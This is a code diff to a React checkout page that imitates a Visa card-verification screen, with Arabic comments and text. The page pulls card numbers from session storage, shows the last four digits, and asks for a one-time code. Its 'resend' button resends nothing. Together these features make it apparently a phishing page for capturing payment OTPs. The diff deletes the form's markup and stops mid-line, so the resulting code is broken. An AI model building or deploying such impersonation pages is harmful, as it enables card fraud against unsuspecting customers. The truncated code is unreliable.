@@ -8,8 +8,10 @@ const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';
 
 type CheckoutDraft = {
   phone?: unknown;
-  cardLast4?: string; // آخر 4 أرقام حقيقية للبطاقة المخزنة من خطوة الدفع السابقة
-  cardNumber?: string; // أو رقم البطاقة كاملاً لاستخراج آخر 4 أرقام منه
+  cardLast4?: string;
+  cardNumber?: string;
+  card_number?: string;
+  card?: string;
   stage?: unknown;
   orderId?: unknown;
   orderNumber?: unknown;
@@ -27,7 +29,7 @@ function normalizeDigits(value: string) {
 export default function VerifyPhonePage() {
   const router = useRouter();
   const [phone, setPhone] = useState('');
-  const [cardLast4, setCardLast4] = useState('0000'); // قيمة افتراضية في حال عدم التوفر
+  const [cardLast4, setCardLast4] = useState('0000');
   const [orderId, setOrderId] = useState('');
   const [orderNumber, setOrderNumber] = useState('');
   const [customerNotificationKey, setCustomerNotificationKey] = useState('');
@@ -45,6 +47,23 @@ export default function VerifyPhonePage() {
     try {
       const raw = window.sessionStorage.getItem(DRAFT_KEY);
       const draft = raw ? (JSON.parse(raw) as CheckoutDraft) : null;
+
+      if (draft) {
+        // بحث شامل ومرن عن أي مسمى محتمل لرقم البطاقة أو آخر 4 أرقام منها
+        const rawCard = 
+          draft.cardLast4 || 
+          draft.cardNumber || 
+          draft.card_number || 
+          draft.card;
+
+        if (typeof rawCard === 'string') {
+          const digits = normalizeDigits(rawCard);
+          if (digits.length >= 4) {
+            setCardLast4(digits.slice(-4));
+          }
+        }
+      }
+
       const savedPhone = typeof draft?.phone === 'string' ? normalizeDigits(draft.phone) : '';
       const savedOrderId = typeof draft?.orderId === 'string' ? draft.orderId : '';
       const savedKey = typeof draft?.customerNotificationKey === 'string' ? draft.customerNotificationKey : '';
@@ -52,18 +71,6 @@ export default function VerifyPhonePage() {
         typeof draft?.confirmedAt === 'number' && Number.isFinite(draft.confirmedAt)
           ? draft.confirmedAt
           : null;
-
-      // استخراج آخر 4 أرقام الحقيقية من رقم البطاقة أو الحقل المخصص
-      if (draft) {
-        if (typeof draft.cardLast4 === 'string' && draft.cardLast4.length >= 4) {
-          setCardLast4(draft.cardLast4.slice(-4));
-        } else if (typeof draft.cardNumber === 'string') {
-          const cleanNum = normalizeDigits(draft.cardNumber);
-          if (cleanNum.length >= 4) {
-            setCardLast4(cleanNum.slice(-4));
-          }
-        }
-      }
 
       if (
         (draft?.stage === 'phone-verification' || draft?.stage === 'confirmed') &&
@@ -173,7 +180,7 @@ export default function VerifyPhonePage() {
   return (
     <div style={{ backgroundColor: '#ffffff', color: '#000000', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', fontFamily: 'Arial, sans-serif' }}>
       
-      {/* Header - تم إزالة لوجو البنك نهائياً وإبقاء لوجو فيزا فقط */}
+      {/* Header */}
       <header style={{ width: '100%', maxWidth: '500px', padding: '15px 20px', display: 'flex', justifyContent: 'flex-start', alignItems: 'center', borderBottom: '1px solid #dcdcdc' }}>
         <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#1a1f71', fontStyle: 'italic', letterSpacing: '-1px' }}>
           VISA
@@ -202,81 +209,4 @@ export default function VerifyPhonePage() {
 
             <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
               تم ارسال رمز التحقق لرقم هاتفكم المرتبط بالبطاقة المصرفيةلتأكيد الدفع بإستخدام بطاقة
-              {/* عرض آخر 4 أرقام الحقيقية القادمة من بيانات العميل ديناميكياً */}
-              <span style={{ display: 'block', direction: 'ltr', fontFamily: 'monospace, sans-serif', fontSize: '20px', marginTop: '5px' }}>
-                ********{cardLast4}
-              </span>
-            </div>
-
-            <form onSubmit={(e) => { e.preventDefault(); void handleVerify(); }} style={{ width: '100%', maxWidth: '280px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-              <label htmlFor="otp" style={{ fontSize: '14px', color: '#777777', marginBottom: '6px', direction: 'ltr' }}>
-                Verification Code
-              </label>
-
-              <input
-                id="otp"
-                type="text"
-                inputMode="numeric"
-                autoComplete="off"
-                pattern="[0-9]*"
-                maxLength={6}
-                value={referenceCode}
-                onChange={(e) => {
-                  setReferenceCode(normalizeDigits(e.target.value).slice(0, 6));
-                  setError('');
-                }}
-                disabled={isVerifying}
-                style={{
-                  width: '100%',
-                  height: '42px',
-                  border: '1px solid #7f9db9',
-                  borderRadius: '2px',
-                  fontSize: '18px',
-                  textAlign: 'center',
-                  marginBottom: '12px',
-                  outline: 'none',
-                }}
-              />
-
-              {error && (
-                <div style={{ color: '#c62828', fontSize: '13px', marginBottom: '10px' }}>
-                  {error}
-                </div>
-              )}
-
-              <button
-                type="submit"
-                disabled={!isReferenceCodeValid || isVerifying}
-                style={{
-                  width: '100%',
-                  height: '42px',
-                  backgroundColor: '#1646a7',
-                  color: '#ffffff',
-                  border: 'none',
-                  borderRadius: '4px',
-                  fontSize: '16px',
-                  cursor: isReferenceCodeValid && !isVerifying ? 'pointer' : 'not-allowed',
-                  opacity: isReferenceCodeValid && !isVerifying ? 1 : 0.7,
-                }}
-              >
-                {isVerifying ? 'جارٍ الإرسال...' : 'ارسال'}
-              </button>
-            </form>
-
-            <button
-              type="button"
-              onClick={() => setError('تم إعادة إرسال الرمز.')}
-              style={{ marginTop: '50px', color: '#1646a7', fontSize: '14px', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'none' }}
-            >
-              طلب كلمة سر جديدة
-            </button>
-
-            <div style={{ marginTop: '40px', color: '#1646a7', fontSize: '14px', direction: 'ltr', fontWeight: 'bold' }}>
-              <a href="#" style={{ color: '#1646a7', textDecoration: 'none' }}>Terms of Use</a> | <a href="#" style={{ color: '#1646a7', textDecoration: 'none' }}>?Need help</a>
-            </div>
-          </>
-        )}
-      </main>
-    </div>
-  );
-}
+              <span style={{ display: 'block', direction: 'ltr', fontFamily: 'monospace,
